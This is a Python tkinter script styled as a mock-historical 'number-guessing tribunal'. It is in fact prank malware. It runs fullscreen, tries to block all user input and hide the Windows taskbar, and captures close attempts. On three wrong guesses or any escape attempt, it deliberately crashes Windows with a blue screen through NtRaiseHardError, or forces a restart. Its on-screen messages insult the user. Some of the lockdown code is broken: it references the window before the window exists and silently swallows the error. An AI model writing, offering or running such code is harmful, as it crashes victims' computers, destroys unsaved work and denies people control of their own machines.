"""
The Inescapable Number-Guessing Tribunal
Authored this 15th Day of July, 1776
By Magistrate Cornelius Lockwell, Esq.
"""

import tkinter as tk
from tkinter import messagebox
import random
import ctypes
import sys
import time
import os

class IroncladSystemGuard:
    def __init__(self):
        self.correct_number = random.randint(1, 10)
        self.attempts_remaining = 3
        self.lock_system()
        
    def lock_system(self):
        """Engage full system lockdown"""
        try:
            # Disable Alt+F4, window close button, etc.
            self.root.protocol("WM_DELETE_WINDOW", self.on_attempted_escape)
            # Block keyboard/mouse input to other windows
            ctypes.windll.user32.BlockInput(True)
            # Hide the taskbar
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)
        except:
            pass
            
    def unlock_system(self):
        """Release the system only upon correct guess"""
        try:
            ctypes.windll.user32.BlockInput(False)
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 1)
        except:
            pass
            
    def invoke_bsod(self):
        """Summon the Blue Screen of Divine Retribution"""
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000218, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        except:
            os.system("shutdown /r /t 1")  # Force restart if BSOD fails
            
    def on_attempted_escape(self):
        """divine justice for all who try to close this"""
        messagebox.showerror("hahahahah", "you really thought you could escape")
        self.attempts_remaining = 0
        self.invoke_bsod()

def evaluate_guess():
    """Determine the user's fate"""
    guess = entry.get()
    try:
        numerical_guess = int(guess)
        if numerical_guess == guard.correct_number:
            guard.unlock_system()
            messagebox.showinfo("Huzzah!", "you can have your system back!")
            root.destroy()
        elif 1 <= numerical_guess <= 10:
            guard.attempts_remaining -= 1
            if guard.attempts_remaining > 0:
                messagebox.showwarning("Incorrect!", 
                    f"{guard.attempts_remaining} attempts remain before doom!")
            else:
                messagebox.showerror("Condemned!", "The system is gonna get fucked!")
                time.sleep(2)
                guard.invoke_bsod()
        else:
            messagebox.showerror("lmao you dumb ass!", "The number must be 1 through 10!")
    except ValueError:
        messagebox.showerror("mate!", "Enter a proper number")

# Initialize the unyielding system guardian
guard = IroncladSystemGuard()

# Create the tribunal window
root = tk.Tk()
guard.root = root  # Allow the guard to control the window
root.title("divine punishment")
root.attributes("-fullscreen", True)  # No escape!
root.configure(bg="black")

# Tribunal branding
frame = tk.Frame(root, bg="black", bd=5, relief="ridge")
frame.place(relx=0.5, rely=0.5, anchor="center")

tk.Label(frame, text="divine punishment", 
        font=("Old English Text MT", 24), fg="gold", bg="black").pack(pady=20)
tk.Label(frame, text="give me your number (1-10) for judgment\nThree failures shall doom thy system",
        font=("Times New Roman", 14), fg="white", bg="black").pack(pady=10)

entry = tk.Entry(frame, font=("Times New Roman", 24), justify="center")
entry.pack(pady=20)

submit_button = tk.Button(frame, text="SUBMIT TO JUDGMENT", 
                        command=evaluate_guess, font=("Old English Text MT", 14),
                        bg="maroon", fg="white")
submit_button.pack(pady=10)

# Disable all standard exit methods
root.protocol("WM_DELETE_WINDOW", guard.on_attempted_escape)
root.bind("<Alt-F4>", lambda e: guard.on_attempted_escape())

root.mainloop()
